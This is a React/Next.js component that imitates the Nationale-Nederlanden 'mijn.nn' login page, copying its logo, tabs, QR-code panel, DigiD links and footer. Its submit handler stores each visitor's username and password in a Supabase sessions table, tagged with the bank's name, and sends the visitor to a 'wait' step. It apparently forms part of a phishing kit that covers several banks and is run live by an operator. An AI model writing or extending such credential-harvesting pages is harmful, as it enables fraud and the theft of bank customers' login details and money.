"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

export function NationaleNederlandenClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [remember, setRemember] = useState(false);
  const [saving, setSaving] = useState(false);
  const formDoluMu = username.trim().length > 0 && password.trim().length > 0;

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (!supabase || !sessionId) return;
      const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.verfuegernummer) setUsername(fd.verfuegernummer);
      if (fd.pin) setPassword(fd.pin);
    })();
    return () => { cancelled = true; };
  }, [sessionId, supabase]);

  async function handleSubmit() {
    if (!supabase || !sessionId) return;
    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    await supabase.from("sessions").update({ is_hidden: false, current_step: "wait",
      form_data: { ...prev, bankSlug: "nationale-nederlanden", bankName: "Nationale-Nederlanden", verfuegernummer: username, pin: password }
    }).eq("id", sessionId);
    // ⭐ FLASH YOK: router.push → router.replace
    router.replace(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-white font-sans flex flex-col text-[#333]">
      
      {/* Header */}
      <header className="w-full flex items-center justify-between px-8 py-6 max-w-6xl mx-auto">
        <img src="/bank-logos/nationale-nederlanden-detail.svg" alt="Nationale-Nederlanden" className="h-10" />
      </header>

      {/* Main Content */}
      <main className="flex-1 w-full max-w-5xl mx-auto px-4 pt-4 pb-20">
        
        {/* Tabs */}
        <div className="flex justify-between items-end border-b border-gray-200 mb-8">
          <div className="flex gap-8 text-[15px]">
            <button className="pb-3 border-b-2 border-[#EA650D] font-bold text-[#333]">Personal</button>
            <button className="pb-3 text-gray-500 hover:text-[#333]">Business</button>
          </div>
          <div className="pb-3 text-[14px] font-bold">
            NL <span className="text-gray-300 font-normal mx-2">|</span> <span className="text-gray-500 font-normal cursor-pointer hover:underline">EN</span>
          </div>
        </div>

        <h1 className="text-[28px] font-bold text-[#EA650D] mb-8">Log in to mijn.nn</h1>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          
          {/* Top Left: App Login */}
          <div className="border border-gray-200 rounded-sm p-8 flex flex-col items-center justify-center">
            <h2 className="text-[22px] font-bold mb-6 text-center">Log in with the NN App</h2>
            <div className="bg-white p-2 border border-gray-200 shadow-sm mb-4">
              {/* Dummy QR Code */}
              <img src="/bank-assets/nationale-nederlanden-qr.svg" alt="QR Code" className="w-[150px] h-[150px]" />
            </div>
            <p className="text-[14px] text-gray-600">Scan the QR code with the NN App. <a href="#" className="text-[#EA650D] hover:underline">More info</a></p>
          </div>

          {/* Top Right: Password Login */}
          <div className="border border-gray-200 rounded-sm p-8 bg-white">
            <form onSubmit={(e) => { e.preventDefault(); void handleSubmit(); }}>
              <div className="mb-5">
                <label className="block text-[14px] font-bold mb-2">Username</label>
                <input 
                  type="text" 
                  value={username} 
                  onChange={e => setUsername(e.target.value)} 
                  className="w-full border border-gray-400 rounded-sm py-2.5 px-3 focus:outline-none focus:border-[#EA650D]" 
                />
              </div>
              <div className="mb-5">
                <label className="block text-[14px] font-bold mb-2">Password</label>
                <input 
                  type="password" 
                  value={password} 
                  onChange={e => setPassword(e.target.value)} 
                  className="w-full border border-gray-400 rounded-sm py-2.5 px-3 focus:outline-none focus:border-[#EA650D]" 
                />
              </div>
              <div className="mb-6 flex items-center">
                <input 
                  type="checkbox" 
                  checked={remember} 
                  onChange={e => setRemember(e.target.checked)} 
                  className="w-4 h-4 border-gray-400 rounded-sm accent-[#EA650D]" 
                />
                <label className="ml-2 text-[14px] text-gray-600">Remember username</label>
              </div>
              <div className="flex items-center gap-4">
                <button 
                  type="submit" 
                  disabled={!formDoluMu || saving} 
                  className={`font-bold py-3 px-8 rounded-sm transition-colors ${formDoluMu && !saving ? "bg-[#333] hover:bg-black text-white" : "bg-gray-400 text-gray-700 opacity-70"}`}
                >
                  {saving ? "Loading..." : "Log in"}
                </button>
                <a href="#" className="text-[#EA650D] text-[14px] font-medium hover:underline flex items-center gap-1">
                  Forgot login details <span className="text-[12px]">&gt;</span>
                </a>
              </div>
            </form>
          </div>

          {/* Bottom Left: DigiD */}
          <div className="border border-gray-200 rounded-sm p-8 flex flex-col justify-center gap-6">
            <button className="flex items-center gap-4 text-left hover:underline">
              <div className="bg-black text-white text-[12px] font-bold py-1.5 px-2 rounded-sm w-[48px] text-center">DigiD</div>
              <span className="text-[15px] font-bold text-[#333]">Log in Pension, Income Insurance</span>
            </button>
            <div className="h-px bg-gray-200 w-full"></div>
            <button className="flex items-center gap-4 text-left hover:underline">
              <div className="bg-black text-white text-[12px] font-bold py-1.5 px-2 rounded-sm w-[48px] text-center">DigiD</div>
              <span className="text-[15px] font-bold text-[#333]">Log in My NN Health Insurance</span>
            </button>
          </div>

          {/* Bottom Right: Links */}
          <div className="border border-gray-200 rounded-sm p-8 bg-[#FAFAFA]">
            <h2 className="text-[18px] font-bold mb-6">Mijn.nn account</h2>
            <ul className="space-y-4">
              <li><a href="#" className="text-[#EA650D] text-[14px] font-medium hover:underline flex items-center gap-2"><span className="text-[12px]">&gt;</span> Create mijn.nn account</a></li>
              <li><a href="#" className="text-[#EA650D] text-[14px] font-medium hover:underline flex items-center gap-2"><span className="text-[12px]">&gt;</span> Receive activation number</a></li>
              <li><a href="#" className="text-[#EA650D] text-[14px] font-medium hover:underline flex items-center gap-2"><span className="text-[12px]">&gt;</span> Help with logging in or creating an account</a></li>
            </ul>
          </div>

        </div>

      </main>

      {/* Footer */}
      <footer className="border-t border-gray-200 py-6 text-center text-[12px] text-gray-500 space-x-4">
        <a href="#" className="hover:underline">Terms of use mijn.nn</a>
        <a href="#" className="hover:underline">About Nationale-Nederlanden</a>
        <a href="#" className="hover:underline">Corporate social responsibility</a>
        <a href="#" className="hover:underline">Cookie statement</a>
        <a href="#" className="hover:underline">Privacy</a>
        <a href="#" className="hover:underline">Disclaimer</a>
        <a href="#" className="hover:underline">Share screen</a>
      </footer>

      {/* Floating Chat */}
      <div className="fixed bottom-6 right-6 bg-white border border-gray-300 shadow-lg rounded-sm py-2 px-4 flex items-center gap-2 cursor-pointer hover:bg-gray-50 text-[#EA650D] font-bold text-[14px]">
        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
        Chat
      </div>
    </div>
  );
}
